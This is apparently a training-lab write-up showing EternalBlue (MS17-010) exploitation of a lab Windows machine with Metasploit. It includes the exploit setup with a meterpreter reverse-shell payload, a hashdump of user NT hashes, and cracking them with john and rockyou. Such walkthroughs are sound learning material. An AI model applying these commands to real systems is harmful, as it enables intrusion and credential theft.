This machine is vulnerable to the `smb-vuln-ms17-010` exploit, known in media as `EternalBlue`.  
It's can be done without Metasploit, of course, but it will be time consuming.  
I'll probably describe non-metasploit method next time.  

---

## Exploitation
Run Metasploit:
```
msfconsole

       =[ metasploit v5.0.101-dev                         ]
+ -- --=[ 2049 exploits - 1108 auxiliary - 344 post       ]
+ -- --=[ 596 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

Metasploit tip: Adapter names can be used for IP params set LHOST eth0

```
Setup the exploit:
```
msf5 > use windows/smb/ms17_010_eternalblue
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf5 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.62.28
RHOSTS => 10.10.62.28
msf5 exploit(windows/smb/ms17_010_eternalblue) > set LHOST tun0
LHOST => tun0
```
It should be fine as it is, but you also might need to change the LPORT too.
Hit `run`:
```
msf5 exploit(windows/smb/ms17_010_eternalblue) > run

A process of migrating the shell is well described in the official material, but I didn't had any issue with the shell as it is.

---

## Post Exploitation
As the shell is already running as `NT AUTHORITY\SYSTEM` we don't need to do a PrivEsc.
However, you might collect some useful data from compromised machine.
Most of OSCP lab machines have something juicy to find if you become a root. Don't skip the enumeration!
To grab users hashes we can use `hashdump` command:
```
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```
We have a hash now! Let's crack it.
Save the hash into the file (jon.hash in my case) and crack it with `john`:
```
/usr/sbin/john -w=/usr/share/wordlists/rockyou.txt --format=NT ./jon.hash
```
Yay! We have Jon's password now.

## Capturing flags
Well, the exercise is explicitly asking you to submit flags, but don't think of them as a CTF flags.
A flag in a good CTF is located in the place where you can't reach it without going an extra mile.
There are three flags in this machine, and they are placed in quite sensitive places:
```
- C:/
- C:/Windows/System32/config/
- C:/Users/Jon/Documents
```
That's make sense. System32/config/ is the place where SAM files located, `Jon` is the admin, so something helpful might be found in the `Documents` folder, etc.

## Takeaway
- Exploits rarely works fine out of the box. You might need a lot of patience to make it work sometimes.
- Not all exploits (especially if we're talking about kernel exploits) are stable. You might need to restart this box a bunch of times.
- Metasploit doesn't always mean that your exploitation phase will go smoothly.
- Post exploitation phase is important.
